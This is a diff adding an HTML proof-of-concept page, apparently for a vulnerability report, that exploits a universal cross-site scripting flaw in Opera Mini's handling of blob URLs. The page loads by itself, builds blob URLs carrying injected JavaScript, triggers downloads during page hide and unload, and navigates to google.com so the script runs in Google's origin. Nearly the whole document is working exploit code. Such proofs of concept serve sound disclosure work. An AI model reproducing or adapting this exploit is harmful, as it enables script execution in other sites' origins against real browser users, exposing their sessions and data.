@@ -1,0 +1,59 @@
+<!doctype html>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Opera Mini blob no-interaction UXSS</title>
+<link rel="preconnect" href="https://example.com" crossorigin>
+<style>
+  body { font: 19px system-ui; margin: 28px; }
+  button { width: 100%; margin-top: 18px; padding: 20px; font: 700 20px system-ui; }
+  pre { white-space: pre-wrap; overflow-wrap: anywhere; }
+</style>
+<h1>Blob direct-navigation UXSS</h1>
+<pre id="status">Waiting for page load…</pre>
+<script>
+let started = false;
+
+function exploit() {
+  if (started) return;
+  started = true;
+
+  const maliciousBlobUrls = [];
+  for (let index = 0; index < 66; index++) {
+    const objectUrl = URL.createObjectURL(new Blob([String(index)], {type: 'text/plain'}));
+    const attackerCode =
+      "#');if(location.origin==='https://www.google.com'&&!window.__blobNoInteractionUxss){window.__blobNoInteractionUxss=1;document.documentElement.dataset.blobNoInteractionUxss='1';document.write('PWNED-BY-BADCAT');alert(document.domain)};function/**/getBlobData(){}//";
+    maliciousBlobUrls.push(objectUrl + attackerCode);
+  }
+
+  function dispatch(url, name) {
+    const link = document.createElement('a');
+    link.download = name + '.bin';
+    link.href = url;
+    document.body.append(link);
+    link.click();
+  }
+
+  addEventListener('visibilitychange', () => {
+    if (!document.hidden) return;
+    for (let index = 0; index < 64; index++) {
+      dispatch(maliciousBlobUrls[index], 'visibility');
+    }
+  }, {once: true});
+  addEventListener('pagehide', () => dispatch(maliciousBlobUrls[64], 'pagehide'), {once: true});
+  addEventListener('unload', () => dispatch(maliciousBlobUrls[65], 'unload'), {once: true});
+
+  document.querySelector('#status').textContent = 'Navigating to the pristine target…';
+  location.href = 'https://www.google.com/';
+}
+
+addEventListener('load', async () => {
+  document.querySelector('#status').textContent = 'Warming the pristine target…';
+  try {
+    await Promise.race([
+      fetch('https://www.google.com/', {mode: 'no-cors', cache: 'reload'}),
+      new Promise(resolve => setTimeout(resolve, 8000))
+    ]);
+  } catch (_) {}
+  setTimeout(exploit, 500);
+}, {once: true});
+</script>
